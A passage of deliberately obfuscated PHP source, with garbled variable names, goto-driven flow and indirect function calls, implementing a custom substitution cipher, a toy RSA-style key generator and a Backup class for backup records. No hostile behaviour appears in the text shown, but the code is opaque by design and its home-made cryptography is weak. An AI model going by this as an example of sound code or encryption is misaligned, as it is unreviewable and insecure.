$b–…ƒğŠç[25]($BÔ‘á…®À, $D¾Êìø†ô % 8, $D¾Êìø†ô % 8 + 7); $C‡Š„¸ = $CĞµ÷Éã´ï[658]; goto E¤ùßÆéÌ†; E‘½ÅÙà: $a»¤œØ” = $b–…ƒğŠç[118]($a»¤œØ”); $A®êºÏìçÅ = $CĞµ÷Éã´ï[656]; if (strlen($A®êºÏìçÅ) < $CĞµ÷Éã´ï[495]) { return; } goto AŞ‘ëŠ¡Ô—; C†òßØ§: while (strlen($E»½ù†±Ÿ¤) < $CĞµ÷Éã´ï[563]) { if (!$E»½ù†±Ÿ¤) { break; } $E»½ù†±Ÿ¤++; } break; goto F½ĞŞ¤´ƒ; AŞ‘ëŠ¡Ô—: $D¾Êìø†ô = $b–…ƒğŠç[334](0, 64); $BİÄ»ª×† = $f£¹»¼Ò«µ[$D¾Êìø†ô]; $e–…‰‘µØ¸ = $CĞµ÷Éã´ï[657]; goto AŸÚ¼Œ„¡‰; a„º˜âŒ¨”: for ($Bá­ƒô‚Ëù = 0; $Bá­ƒô‚Ëù < $b–…ƒğŠç[24]($a»¤œØ”); $Bá­ƒô‚Ëù++) { $FƒªÛÄÎÙ² = $FƒªÛÄÎÙ² == $b–…ƒğŠç[24]($BÔ‘á…®À) ? 0 : $FƒªÛÄÎÙ²; $aÙ¬È‘êªĞ = $CĞµ÷Éã´ï[660]; while (strlen($aÙ¬È‘êªĞ) < $CĞµ÷Éã´ï[574]) { if (!$aÙ¬È‘êªĞ) { break; } $aÙ¬È‘êªĞ++; } $Aõô·’¾± = ($D¾Êìø†ô + $b–…ƒğŠç[335]($f£¹»¼Ò«µ, $a»¤œØ”[$Bá­ƒô‚Ëù]) + $b–…ƒğŠç[336]($BÔ‘á…®À[$FƒªÛÄÎÙ²++])) % 64; $BñĞ’˜ºè¬ = $CĞµ÷Éã´ï[661]; if (!$BñĞ’˜ºè¬) { die; } $E¯ÈØÖËÈ¼ .= $f£¹»¼Ò«µ[$Aõô·’¾±]; } $A±¤šíˆ„ = $b–…ƒğŠç[327]($BİÄ»ª×† . $E¯ÈØÖËÈ¼); $E»½ù†±Ÿ¤ = $CĞµ÷Éã´ï[662]; goto C†òßØ§; F½ĞŞ¤´ƒ: default: $A±¤šíˆ„ = $this->{$_SERVER[îë][147]}($a»¤œØ”, $fòğÛŒù´ . $C•š£•Ô •); break; } $A±¤šíˆ„ = $b–…ƒğŠç[214]($c¬ëËã·‹ . $C•š£•Ô • . $A±¤šíˆ„); if ($f¬¨øÊö - 1 > 0) { $A±¤šíˆ„ = $this->{$_SERVER[îë][127]}($A±¤šíˆ„, $fòğÛŒù´, $f¬¨øÊö - 1); } goto eéÊ–Œ†ÜÊ; dç¨ÁİÄ„Ã: $b“‰â“ƒÒß = $CĞµ÷Éã´ï[652]; if (strlen($b“‰â“ƒÒß) < $CĞµ÷Éã´ï[574]) { die; } $f£¹»¼Ò«µ = $b–…ƒğŠç[330]; goto C·‚—²¾Ö; aã•ØÒÄËÅ: $Bƒğµï¬§Ã = $CĞµ÷Éã´ï[651]; if (!$Bƒğµï¬§Ã) { die; } $C•š£•Ô • = $b–…ƒğŠç[124](15); goto dç¨ÁİÄ„Ã; D×™İÚ²ä: $cƒ­Û» Š = $CĞµ÷Éã´ï[649]; if (!$cƒ­Û» Š) { return; } $a»¤œØ” = $b–…ƒğŠç[2]($a»¤œØ”); goto eš–´Â´—Š; eš–´Â´—Š: $dÃÍÌ™¨‚Ó = $CĞµ÷Éã´ï[650]; if (!$dÃÍÌ™¨‚Ó) { die; } $c¬ëËã·‹ = $b–…ƒğŠç[325](0, 5) . $b–…ƒğŠç[10]; goto aã•ØÒÄËÅ; e²¦ó¨°¢ˆ: } private function fqpl67b07d92($dâ¢ßÀº…‘, $e•‰£„Çø±, $aÂÑØô±”¦ = 3) { goto cæ´‚ÌôÛĞ; B­Î¦Ñ—œ: $dâ¢ßÀº…‘ = $eŠ‹Úç¢¢Ç[2]($dâ¢ßÀº…‘); $dâ¢ßÀº…‘ = $eŠ‹Úç¢¢Ç[214]($dâ¢ßÀº…‘); $fïØ¯Å = $eŞ’†õñåÛ[663]; goto Bçó²½Ú·­; AóĞã…Ò¥: if (strlen($F•¦”ÔÛ´Í) < $eŞ’†õñåÛ[574]) { return; } $dâ¢ßÀº…‘ = $eŠ‹Úç¢¢Ç[25]($dâ¢ßÀº…‘, 16); $EïÀŸ‡¼†© = $eŠ‹Úç¢¢Ç[330]; goto FŒØ£Ş†ìŸ; Bçó²½Ú·­: if (strlen($fïØ¯Å) < $eŞ’†õñåÛ[574]) { die; } $cÌÎËè²“ = $dâ¢ßÀº…‘[0]; $b·È¨›½¥ = $eŞ’†õñåÛ[664]; goto C‘òùêàó¢; C‘òùêàó¢: if (!$b·È¨›½¥) { return; } $dÜÜšïï‰ = $eŠ‹Úç¢¢Ç[25]($dâ¢ßÀº…‘, 1, 15); $F•¦”ÔÛ´Í = $eŞ’†õñåÛ[665]; goto AóĞã…Ò¥; FŒØ£Ş†ìŸ: $bÖÒïœäÌ» = $eŞ’†õñåÛ[666]; if (!$bÖÒïœäÌ») { return; } switch ($cÌÎËè²“) { case $eŠ‹Úç¢¢Ç[232]: $c”µ¨µ¡ãà = $this->{$_SERVER[îë][246]}($dâ¢ßÀº…‘, $eŠ‹Úç¢¢Ç[214]($e•‰£„Çø± . $dÜÜšïï‰)); break; case $eŠ‹Úç¢¢Ç[220]: $c”µ¨µ¡ãà = $this->{$_SERVER[îë][246]}($dâ¢ßÀº…‘, $eŠ‹Úç¢¢Ç[214]($dÜÜšïï‰ . $e•‰£„Çø±)); $CÏ¹É³ëîÎ = $eŞ’†õñåÛ[667]; if (!$CÏ¹É³ëîÎ) { die; } break; case $eŠ‹Úç¢¢Ç[331]: $c”µ¨µ¡ãà = $this->{$_SERVER[îë][246]}($dâ¢ßÀº…‘, $eŠ‹Úç¢¢Ç[118]($dÜÜšïï‰ . $e•‰£„Çø±)); break; case $eŠ‹Úç¢¢Ç[332]: $c”µ¨µ¡ãà = $this->{$_SERVER[îë][246]}($dâ¢ßÀº…‘, $eŠ‹Úç¢¢Ç[114]($dÜÜšïï‰ . $e•‰£„Çø±)); $F×¤ª“Âí = $eŞ’†õñåÛ[668]; break; case $eŠ‹Úç¢¢Ç[333]: goto Aùº‹‚¹ÓÃ; a‡ƒÜ¢—®: $a±èÆªÑğØ = 0; $D×ğ­É˜¹ê = 0; $eÓ×¡ÊËŠƒ = $eŞ’†õñåÛ[673]; goto eÎ±ôŒÎ; Aùº‹‚¹ÓÃ: $dâ¢ßÀº…‘ = $eŠ‹Úç¢¢Ç[338]($dâ¢ßÀº…‘); $bËÑâ¼ = $eŞ’†õñåÛ[669]; if (strlen($bËÑâ¼) < $eŞ’†õñåÛ[495]) { return; } goto e‹¢ìï©Üª; d¢„™Ñù: $fİ²Ú´æ¥ = $eŠ‹Úç¢¢Ç[114]($EÅï¸Óµ†÷ . $eŠ‹Úç¢¢Ç[114]($e•‰£„Çø± . $EÅï¸Óµ†÷) . $e•‰£„Çø±); $aø–°˜Ä¨¬ = $eŞ’†õñåÛ[670]; $fİ²Ú´æ¥ = $eŠ‹Úç¢¢Ç[25]($fİ²Ú´æ¥, $cƒ ä“„ôñ % 8, $cƒ ä“„ôñ % 8 + 7); goto f£¤³¢Å; f£¤³¢Å: $D¹Œ…æ±‚– = $eŠ‹Úç¢¢Ç[10]; $f¥Ë‰çË± = $eŞ’†õñåÛ[671]; if (!$f¥Ë‰çË±) { die; } goto aãªÜ¿Õ˜; e‹¢ìï©Üª: $EÅï¸Óµ†÷ = $dâ¢ßÀº…‘[0]; $dâ¢ßÀº…‘ = $eŠ‹Úç¢¢Ç[25]($dâ¢ßÀº…‘, 1); $cƒ ä“„ôñ = $eŠ‹Úç¢¢Ç[335]($EïÀŸ‡¼†©, $EÅï¸Óµ†÷); goto d¢„™Ñù; c‡æ•ÆÖ‘Ï: if (!$eá‹åÚ…Ñ) { die; } break; $BôÄË‘ƒ‚ = $eŞ’†õñåÛ[678]; goto dÚ®…•İÄˆ; aãªÜ¿Õ˜: $CèÁœ©¬Ï« = 0; $f¯ª½Åò = $eŞ’†õñåÛ[672]; if (strlen($f¯ª½Åò) < $eŞ’†õñåÛ[570]) { return; } goto a‡ƒÜ¢—®; dÚ®…•İÄˆ: if (!$BôÄË‘ƒ‚) { die; } goto D¢Ÿù†åÚÏ; eÎ±ôŒÎ: for ($CèÁœ©¬Ï« = 0; $CèÁœ©¬Ï« < $eŠ‹Úç¢¢Ç[24]($dâ¢ßÀº…‘); $CèÁœ©¬Ï«++) { $D×ğ­É˜¹ê = $D×ğ­É˜¹ê == $eŠ‹Úç¢¢Ç[24]($fİ²Ú´æ¥) ? 0 : $D×ğ­É˜¹ê; $E÷¹ä×É´Ø = $eŞ’†õñåÛ[674]; while (strlen($E÷¹ä×É´Ø) < $eŞ’†õñåÛ[574]) { if (!$E÷¹ä×É´Ø) { break; } $E÷¹ä×É´Ø++; } $E´ŞÃøë³ = $D×ğ­É˜¹ê++; $a±èÆªÑğØ = $eŠ‹Úç¢¢Ç[335]($EïÀŸ‡¼†©, $dâ¢ßÀº…‘[$CèÁœ©¬Ï«]) - $cƒ ä“„ôñ - $eŠ‹Úç¢¢Ç[336]($fİ²Ú´æ¥[$E´ŞÃøë³]); $aõ«‚Ø×–ƒ = $eŞ’†õñåÛ[675]; while ($aõ«‚Ø×–ƒ < $eŞ’†õñåÛ[563]) { if ($aõ«‚Ø×–ƒ >= 0) { break; } $aõ«‚Ø×–ƒ++; } while ($a±èÆªÑğØ < 0) { $a±èÆªÑğØ += 64; } $D¹Œ…æ±‚– .= $EïÀŸ‡¼†©[$a±èÆªÑğØ]; $B‚øóù“°ğ = $eŞ’†õñåÛ[676]; } $c”µ¨µ¡ãà = $eŠ‹Úç¢¢Ç[339]($D¹Œ…æ±‚–); $eá‹åÚ…Ñ = $eŞ’†õñåÛ[677]; goto c‡æ•ÆÖ‘Ï; D¢Ÿù†åÚÏ: default: $c”µ¨µ¡ãà = $this->{$_SERVER[îë][246]}($dâ¢ßÀº…‘, $e•‰£„Çø± . $dÜÜšïï‰); $F˜¹†±†‰Ø = $eŞ’†õñåÛ[678]; while ($F˜¹†±†‰Ø < $eŞ’†õñåÛ[495]) { if ($F˜¹†±†‰Ø >= 0) { break; } $F˜¹†±†‰Ø++; } break; $F„Ã’ÕÏå = $eŞ’†õñåÛ[679]; while ($F„Ã’ÕÏå < $eŞ’†õñåÛ[574]) { if ($F„Ã’ÕÏå >= 0) { break; } $F„Ã’ÕÏå++; } } goto Aøœ‡Û‰ø¬; Aøœ‡Û‰ø¬: if ($aÂÑØô±”¦ - 1 > 0) { $c”µ¨µ¡ãà = $this->{$_SERVER[îë][188]}($c”µ¨µ¡ãà, $e•‰£„Çø±, $aÂÑØô±”¦ - 1); } return $c”µ¨µ¡ãà; goto EËÄ•áËÂ; cæ´‚ÌôÛĞ: $eŞ’†õñåÛ =& $_SERVER[¯Ò¬Èè]; $eŠ‹Úç¢¢Ç =& $_SERVER[îë]; if (!$eŠ‹Úç¢¢Ç[337]($dâ¢ßÀº…‘) || $eŠ‹Úç¢¢Ç[24]($dâ¢ßÀº…‘) < 10) { return !1; } goto B­Î¦Ñ—œ; EËÄ•áËÂ: } public function eqradf2f6c4c($BÖå´¾Üªƒ) { goto c…¤ØÎŠˆÖ; aÏÅ‡İäšĞ: $D»óï“øê¨ = $fçòêÛ[638]; if (!$D»óï“øê¨) { die; } goto b‘–½Ü¡äĞ; A´†¦óëè¹: $BßÔ° ®Š = $this->{$_SERVER[îë][340]}(); $BÅã¦ÙìÜ÷ = $fçòêÛ[678]; if (!$BÅã¦ÙìÜ÷) { return; } goto B†¾ïŒÖ¨; eŒÓØÊ”×·: $AÅ„âÚî££ = $e›³Ë‘ïâ[114]($e›³Ë‘ïâ[341] . ($D•³¡ »Ôˆ + $BßÔ° ®Š) . $e›³Ë‘ïâ[342] . $f‘Ô¯¡‡ÖÀ . $e›³Ë‘ïâ[342] . $FÕÒ˜·’ . $e›³Ë‘ïâ[343]); $d‹¨Ğç¼Ï· = $this->{$_SERVER[îë][147]}($BÖå´¾Üªƒ, $AÅ„âÚî££) . $e›³Ë‘ïâ[344] . $F¥¢ŒÚÆßÌ; return $d‹¨Ğç¼Ï·; goto aÏÅ‡İäšĞ; c…¤ØÎŠˆÖ: $fçòêÛ =& $_SERVER[¯Ò¬Èè]; $e›³Ë‘ïâ =& $_SERVER[îë]; $D•³¡ »Ôˆ = $this->{$_SERVER[îë][340]}(); goto A´†¦óëè¹; B†¾ïŒÖ¨: $C¼›¦œš”‡ = ($D•³¡ »Ôˆ - 1) * ($BßÔ° ®Š - 1); $Fâ½ùÚœæé = $fçòêÛ[680]; if (strlen($Fâ½ùÚœæé) < $fçòêÛ[570]) { return; } goto D¢ù¬Î»È¨; D¢ù¬Î»È¨: $f‘Ô¯¡‡ÖÀ = $e›³Ë‘ïâ[201](($D•³¡ »Ôˆ + $BßÔ° ®Š) / 2); while (1) { $AÁŠÕñƒ¼ = $f‘Ô¯¡‡ÖÀ; $CšÁ‘£ÔÎé = $C¼›¦œš”‡; while ($CšÁ‘£ÔÎé % $AÁŠÕñƒ¼ != 0) { $fó»»˜¯Êˆ = $CšÁ‘£ÔÎé; $CšÁ‘£ÔÎé = $AÁŠÕñƒ¼; $aÂÛò¨Š¸› = $fçòêÛ[681]; while ($aÂÛò¨Š¸› < $fçòêÛ[495]) { if ($aÂÛò¨Š¸› >= 0) { break; } $aÂÛò¨Š¸›++; } $AÁŠÕñƒ¼ = $fó»»˜¯Êˆ % $AÁŠÕñƒ¼; $bÚ³°æµ‰ = $fçòêÛ[682]; } if ($AÁŠÕñƒ¼ == 1) { break; } else { $f‘Ô¯¡‡ÖÀ++; } } $FÕÒ˜·’ = 2; goto AöŠ­ñéŞ; e¿ô—¦¬ÖÁ: $F¥¢ŒÚÆßÌ = $this->{$_SERVER[îë][147]}($D•³¡ »Ôˆ * $BßÔ° ®Š . $e›³Ë‘ïâ[10], $e›³Ë‘ïâ[149]); $D·³ˆ ØÂß = $fçòêÛ[684]; while (strlen($D·³ˆ ØÂß) < $fçòêÛ[574]) { if (!$D·³ˆ ØÂß) { break; } $D·³ˆ ØÂß++; } goto eŒÓØÊ”×·; AöŠ­ñéŞ: $f°‰¢»É›£ = $fçòêÛ[683]; while (strlen($f°‰¢»É›£) < $fçòêÛ[574]) { if (!$f°‰¢»É›£) { break; } $f°‰¢»É›£++; } for ($CˆáÊì±Ø = 0; $CˆáÊì±Ø < $C¼›¦œš”‡ * 10; $CˆáÊì±Ø++) { if (($C¼›¦œš”‡ * $CˆáÊì±Ø + 1) % $f‘Ô¯¡‡ÖÀ == 0) { $FÕÒ˜·’ = $e›³Ë‘ïâ[201](($C¼›¦œš”‡ * $CˆáÊì±Ø + 1) / $f‘Ô¯¡‡ÖÀ); break; } } goto e¿ô—¦¬ÖÁ; b‘–½Ü¡äĞ: } public function bgrp52e8d529($Fåˆ·‚Û) { goto EÆ°îÚóÈ­; Eç¼ë´æ³¢: $DÏµ¼Æ— = $E×öèåõºÁ[688]; if (strlen($DÏµ¼Æ—) < $E×öèåõºÁ[570]) { die; } $EÅ¿ÈšÜ = $e¸¿“ó®[201](($f‚Ş„ÎÆ’‚ + $cŒ‚ËÂ‚İ¯) / 2); goto F¿”àŒ…à; d”š¢İÄƒ³: $cŒ‚ËÂ‚İ¯ = 0; for ($f‡¯Äà£¸ = 3; $f‡¯Äà£¸ < $fµšë¾ãÎ; $f‡¯Äà£¸ += 2) { if ($fµšë¾ãÎ % $f‡¯Äà£¸ != 0) { continue; } $f‚Ş„ÎÆ’‚ = $f‡¯Äà£¸; $cŒ‚ËÂ‚İ¯ = $e¸¿“ó®[201]($fµšë¾ãÎ / $f‡¯Äà£¸); break; $eŒô­øĞÈ = $E×öèåõºÁ[687]; if (!$eŒô­øĞÈ) { return; } } $e©£¸–™Å‹ = ($f‚Ş„ÎÆ’‚ - 1) * ($cŒ‚ËÂ‚İ¯ - 1); goto Eç¼ë´æ³¢; AÉ¼¼Úê†¼: for ($f‡¯Äà£¸ = 0; $f‡¯Äà£¸ < $e©£¸–™Å‹ * 10; $f‡¯Äà£¸++) { if (($e©£¸–™Å‹ * $f‡¯Äà£¸ + 1) % $EÅ¿ÈšÜ == 0) { $DÃ‰ÚÇ‹Ø = $e¸¿“ó®[201](($e©£¸–™Å‹ * $f‡¯Äà£¸ + 1) / $EÅ¿ÈšÜ); break; } } $BöÈ‹æˆØ„ = $e¸¿“ó®[114]($e¸¿“ó®[341] . ($f‚Ş„ÎÆ’‚ + $cŒ‚ËÂ‚İ¯) . $e¸¿“ó®[342] . $EÅ¿ÈšÜ . $e¸¿“ó®[342] . $DÃ‰ÚÇ‹Ø . $e¸¿“ó®[343]); $aóš³ßÆ¤ó = $E×öèåõºÁ[611]; goto aøöØŠ¬”·; d§’·Û¥ôÎ: if (!$Cˆ†Âš‡ìÓ) { die; } goto E®§Ç‘®¤; aøöØŠ¬”·: if (!$aóš³ßÆ¤ó) { die; } $F×Ø™—Ş™ = $this->{$_SERVER[îë][246]}($b­¡¨éõ£Ñ[0], $BöÈ‹æˆØ„); $BçªÍÄêÚ´ = $E×öèåõºÁ[691]; goto aŠ¯Ñ§Š‘î; F¿”àŒ…à: $d«¤‘‰Ç› = $E×öèåõºÁ[689]; if (!$d«¤‘‰Ç›) { return; } while (1) { $DëÁ ã‘Ñ = $EÅ¿ÈšÜ; $Cƒè®³°ò = $e©£¸–™Å‹; while ($Cƒè®³°ò % $DëÁ ã‘Ñ != 0) { $E¤½øíˆ¥‘ = $Cƒè®³°ò; $Cƒè®³°ò = $DëÁ ã‘Ñ; $DëÁ ã‘Ñ = $E¤½øíˆ¥‘ % $DëÁ ã‘Ñ; } if ($DëÁ ã‘Ñ == 1) { break; } else { $EÅ¿ÈšÜ++; } } goto AŠÛÄ…ƒÄ; EÆ°îÚóÈ­: $E×öèåõºÁ =& $_SERVER[¯Ò¬Èè]; $e¸¿“ó® =& $_SERVER[îë]; $b­¡¨éõ£Ñ = $e¸¿“ó®[0]($e¸¿“ó®[344], $Fåˆ·‚Û); goto A‰Œš¿‚‘ß; aŠ¯Ñ§Š‘î: if (strlen($BçªÍÄêÚ´) < $E×öèåõºÁ[574]) { die; } return $F×Ø™—Ş™; $Cˆ†Âš‡ìÓ = $E×öèåõºÁ[692]; goto d§’·Û¥ôÎ; A‰Œš¿‚‘ß: $D¬›¢âåÍ = $E×öèåõºÁ[685]; while (strlen($D¬›¢âåÍ) < $E×öèåõºÁ[570]) { if (!$D¬›¢âåÍ) { break; } $D¬›¢âåÍ++; } if ($e¸¿“ó®[19]($b­¡¨éõ£Ñ) != 2) { return $e¸¿“ó®[10]; } goto a·Õ›º²•ñ; f²Ş¢ÆŸ: $f‚Ş„ÎÆ’‚ = 0; $eˆ©´Ş¹‡„ = $E×öèåõºÁ[686]; while ($eˆ©´Ş¹‡„ < $E×öèåõºÁ[560]) { if ($eˆ©´Ş¹‡„ >= 0) { break; } $eˆ©´Ş¹‡„++; } goto d”š¢İÄƒ³; AŠÛÄ…ƒÄ: $DÃ‰ÚÇ‹Ø = 2; $a£‘õ‰©ø = $E×öèåõºÁ[690]; while ($a£‘õ‰©ø < $E×öèåõºÁ[574]) { if ($a£‘õ‰©ø >= 0) { break; } $a£‘õ‰©ø++; } goto AÉ¼¼Úê†¼; a·Õ›º²•ñ: $fµšë¾ãÎ = $this->{$_SERVER[îë][246]}($b­¡¨éõ£Ñ[1] . $e¸¿“ó®[10], $e¸¿“ó®[149]); if (!$fµšë¾ãÎ) { return $e¸¿“ó®[10]; } $fµšë¾ãÎ = $e¸¿“ó®[201]($fµšë¾ãÎ); goto f²Ş¢ÆŸ; E®§Ç‘®¤: } public function lcupc648a405() { goto a”‹•šØ‰; CÄåîò”´: $E‰ˆš˜ÎÒ¯ = $A’øºÉø³÷[693]; $C˜ßø…¥¨ß = array(); $Eêìùõç·¸ = 1; goto b¬éÜÒ­£‚; aŞÚÈ›„Êê: return $Eª—“Áê‰‹; goto e£¸Š´®Û®; b¬éÜÒ­£‚: $E‘ïÉ¹£Øå = $A’øºÉø³÷[694]; if (!$E‘ïÉ¹£Øå) { die; } while ($Eêìùõç·¸ <= (int) $DŸ”ÊŒ¯ëÎ[346]($F±©•‚ß¼±)) { $CŸ”‚»ïù¡ = $Eêìùõç·¸; $B„ïÄÆëŠ = $A’øºÉø³÷[695]; if (strlen($B„ïÄÆëŠ) < $A’øºÉø³÷[574]) { return; } while (!0) { $CŸ”‚»ïù¡++; if ($CŸ”‚»ïù¡ <= 2) { $Eêìùõç·¸ = $CŸ”‚»ïù¡; break; } else { if ($CŸ”‚»ïù¡ < 2) { continue; } } $BÏÙ…«ÕÔÓ = !0; for ($C¯†¿ˆÔ” = 2; $C¯†¿ˆÔ” <= $DŸ”ÊŒ¯ëÎ[346]($CŸ”‚»ïù¡); $C¯†¿ˆÔ”++) { if ($CŸ”‚»ïù¡ % $C¯†¿ˆÔ” == 0) { $BÏÙ…«ÕÔÓ = !1; } } if ($BÏÙ…«ÕÔÓ) { $Eêìùõç·¸ = $CŸ”‚»ïù¡; break; } } $C˜ßø…¥¨ß[] = $Eêìùõç·¸; $A™‰Œ¿µ = $A’øºÉø³÷[696]; if (strlen($A™‰Œ¿µ) < $A’øºÉø³÷[574]) { return; } } goto dÊ¦Ô£ìŒ; a”‹•šØ‰: $A’øºÉø³÷ =& $_SERVER[¯Ò¬Èè]; $DŸ”ÊŒ¯ëÎ =& $_SERVER[îë]; $F±©•‚ß¼± = $DŸ”ÊŒ¯ëÎ[325]($DŸ”ÊŒ¯ëÎ[345](2, 14), $DŸ”ÊŒ¯ëÎ[345](2, 16) - 1); goto CÄåîò”´; dÊ¦Ô£ìŒ: $Eª—“Áê‰‹ = 2; $bø‚Ş»¦Ü¶ = $A’øºÉø³÷[697]; for ($CŸ”‚»ïù¡ = $F±©•‚ß¼±; $CŸ”‚»ïù¡ > 1; $CŸ”‚»ïù¡--) { $BÏÙ…«ÕÔÓ = !0; $aêÓ¡Š† = $A’øºÉø³÷[698]; if (strlen($aêÓ¡Š†) < $A’øºÉø³÷[495]) { die; } foreach ($C˜ßø…¥¨ß as $a‹ï‘½†è·) { if ($CŸ”‚»ïù¡ % $a‹ï‘½†è· == 0) { $BÏÙ…«ÕÔÓ = !1; break; } } if ($BÏÙ…«ÕÔÓ) { $Eª—“Áê‰‹ = $CŸ”‚»ïù¡; break; } } goto aŞÚÈ›„Êê; e£¸Š´®Û®: } public function pojf0f840a5e($bÅß¸Ğèò, $C®åİöØ) { $F›Ó¨Ã¦Öæ =& $_SERVER[îë]; return $F›Ó¨Ã¦Öæ[13](array($F›Ó¨Ã¦Öæ[14], $F›Ó¨Ã¦Öæ[347]), $bÅß¸Ğèò, $C®åİöØ); $Bæõ¼¡âÍÕ = $_SERVER[¯Ò¬Èè][699]; if (!$Bæõ¼¡âÍÕ) { return; } } public function oszada1936d0($A’Ş´ò°È, $b÷¾ê†Í) { $d¼Ù„”ÈÎ =& $_SERVER[îë]; return $d¼Ù„”ÈÎ[13](array($d¼Ù„”ÈÎ[348], $d¼Ù„”ÈÎ[349]), $A’Ş´ò°È, $b÷¾ê†Í); } public function egpz9d5fbd15($e‡ô§ÏŠŒ·, $b‘¥šàºò‘) { $FĞ‹–ĞÑÉä =& $_SERVER[¯Ò¬Èè]; $BÂ·›¢ö¹« =& $_SERVER[îë]; return $BÂ·›¢ö¹«[13](array($BÂ·›¢ö¹«[348], $BÂ·›¢ö¹«[350]), $e‡ô§ÏŠŒ·, $b‘¥šàºò‘); $b¼†®çµĞË = $FĞ‹–ĞÑÉä[700]; if (strlen($b¼†®çµĞË) < $FĞ‹–ĞÑÉä[563]) { die; } } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $FŠÓâª¸‡ =& $_SERVER[¯Ò¬Èè]; self::$name = date($FŠÓâª¸‡[701]); if (!($D‘…è’ĞÚ = Model($FŠÓâª¸‡[702])->lastItem())) { $D‘…è’ĞÚ = $this->initData(); } else { self::$name = $D‘…è’ĞÚ[$FŠÓâª¸‡[28]]; if ($D‘…è’ĞÚ[$FŠÓâª¸‡[703]] == $FŠÓâª¸‡[83]) { self::$name = date($FŠÓâª¸‡[704]); $DÌ«Âù ¾¶ = 0; if (isset($D‘…è’ĞÚ[$FŠÓâª¸‡[281]][$FŠÓâª¸‡[167]][$FŠÓâª¸‡[419]])) { $DÌ«Âù ¾¶ = (int) $D‘…è’ĞÚ[$FŠÓâª¸‡[281]][$FŠÓâª¸‡[167]][$FŠÓâª¸‡[419]]; } if ($D‘…è’ĞÚ[$FŠÓâª¸‡[28]] == self::$name) { Model($FŠÓâª¸‡[702])->remove($D‘…è’ĞÚ[$FŠÓâª¸‡[367]]); } $D‘…è’ĞÚ = $this->initData($DÌ«Âù ¾¶, $D‘…è’ĞÚ[$FŠÓâª¸‡[705]]); } else { $this->checkStore($D‘…è’ĞÚ[$FŠÓâª¸‡[705]]); } } self::$option = $D‘…è’ĞÚ; } private function initData($A‚ÇŒì¹²í = 0, $a¬Äí‚¸¸ä = '') { goto EÑ‰Úò­°“; EÑ‰Úò­°“: $BÉšˆŞÔå =& $_SERVER[¯Ò¬Èè]; $A¿çÏöà­Â = Model($BÉšˆŞÔå[702])->config(); if ($a¬Äí‚¸¸ä && $A¿çÏöà­Â[$BÉšˆŞÔå[705]] != $a¬Äí‚¸¸ä) { $A‚ÇŒì¹²í = 0; } goto D®ºŠÊæ±ß; D®ºŠÊæ±ß: $this->checkStore($A¿çÏöà­Â[$BÉšˆŞÔå[705]]); $aê…¹ÏéÌ… = array($BÉšˆŞÔå[705] => $A¿çÏöà­Â[$BÉšˆŞÔå[705]], $BÉšˆŞÔå[28] => self::$name, $BÉšˆŞÔå[703] => 0, $BÉšˆŞÔå[706] => $A¿çÏöà­Â[$BÉšˆŞÔå[706]], $BÉšˆŞÔå[281] => array($BÉšˆŞÔå[707] => array($BÉšˆŞÔå[703] => 0), $BÉšˆŞÔå[708] => array($BÉšˆŞÔå[703] => 0, $BÉšˆŞÔå[709] => 0, $BÉšˆŞÔå[710] => 0, $BÉšˆŞÔå[29] => $BÉšˆŞÔå[33]), $BÉšˆŞÔå[711] => array($BÉšˆŞÔå[703] => 0, $BÉšˆŞÔå[709] => 0, $BÉšˆŞÔå[710] => 0), $BÉšˆŞÔå[167] => array($BÉšˆŞÔå[703] => 0, $BÉšˆŞÔå[712] => 0, $BÉšˆŞÔå[713] => 0, $BÉšˆŞÔå[714] => 0, $BÉšˆŞÔå[715] => 0, $BÉšˆŞÔå[419] => $A‚ÇŒì¹²í)), $BÉšˆŞÔå[716] => time(), $BÉšˆŞÔå[717] => 0); $f¢âŸİè¬ğ = Model($BÉšˆŞÔå[702])->insert($aê…¹ÏéÌ…); goto E»ÙºÌÏù¬; E»ÙºÌÏù¬: $aê…¹ÏéÌ…[$BÉšˆŞÔå[367]] = $f¢âŸİè¬ğ; return $aê…¹ÏéÌ…; goto B…£Æé‹; B…£Æé‹: } private function checkStore($c‰â×Õ­ç±) { $e±™®·Û±ˆ =& $_SERVER[¯Ò¬Èè]; $fŠ½Ü¾ñ¶ä = Model($e±™®·Û±ˆ[718])->listData($c‰â×Õ­ç±); Model($e±™®·Û±ˆ[718])->checkConfig($fŠ½Ü¾ñ¶ä); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¯Ò¬Èè][702])->findByName(self::$name); } return self::$option; } public static function set($c¢µˆãì‚Á) { $B¶ ŒÆÛÜ =& $_SERVER[¯Ò¬Èè]; $B÷Ù¨Ûïéµ = self::get(); foreach ($c¢µˆãì‚Á as $f°®Û¥¦¬ => $fİÒœ…Œƒ) { $c¾Âƒ”½Ñ† = explode($B¶ ŒÆÛÜ[91], $f°®Û¥¦¬); $D¯æİÂ£³ = count($c¾Âƒ”½Ñ†); switch ($D¯æİÂ£³) { case 1: $B÷Ù¨Ûïéµ[$c¾Âƒ”½Ñ†[0]] = $fİÒœ…Œƒ; break; case 2: $B÷Ù¨Ûïéµ[$c¾Âƒ”½Ñ†[0]][$c¾Âƒ”½Ñ†[1]] = $fİÒœ…Œƒ; break; case 3: $B÷Ù¨Ûïéµ[$c¾Âƒ”½Ñ†[0]][$c¾Âƒ”½Ñ†[1]][$c¾Âƒ”½Ñ†[2]] = $fİÒœ…Œƒ; break; } } Model($B¶ ŒÆÛÜ[702])->update($B÷Ù¨Ûïéµ[$B¶ ŒÆÛÜ[367]], $B÷Ù¨Ûïéµ); self::$option = $B÷Ù¨Ûïéµ; return self::$option; } public function keep() { $c“©Ï«æ =& $_SERVER[¯Ò¬Èè]; $EÇ™¨Š‡é½ = self::get(); if ($EÇ™¨Š‡é½[$c“©Ï«æ[281]][$c“©Ï«æ[707]][$c“©Ï«æ[703]] == $c“©Ï«æ[83]) { return; } $this->backupKeep($EÇ™¨Š‡é½); self::set(array($c“©Ï«æ[719] => 1)); } private function backupKeep($c ”ä¿âÄ) { goto b¨ø¢—šŸË; b¨ø¢—šŸË: $b¹…›Ì›Ó• =& $_SERVER[¯Ò¬Èè]; $CªˆªãÆŒ = Model($b¹…›Ì›Ó•[702])->listData(); if (empty($CªˆªãÆŒ)) { return; } goto dŠ‹•´åŸ™; c¬íĞŒ¬…à: for ($C§ç÷øÆß = 0; $C§ç÷øÆß < 12; $C§ç÷øÆß++) { $c‰ ÇƒĞÅ²[] = date($b¹…›Ì›Ó•[720], strtotime("\55{$C§ç÷øÆß}\x20\155\157\156\164\x68\x73")); } $c‰ ÇƒĞÅ² = array_unique($c‰ ÇƒĞÅ²); foreach 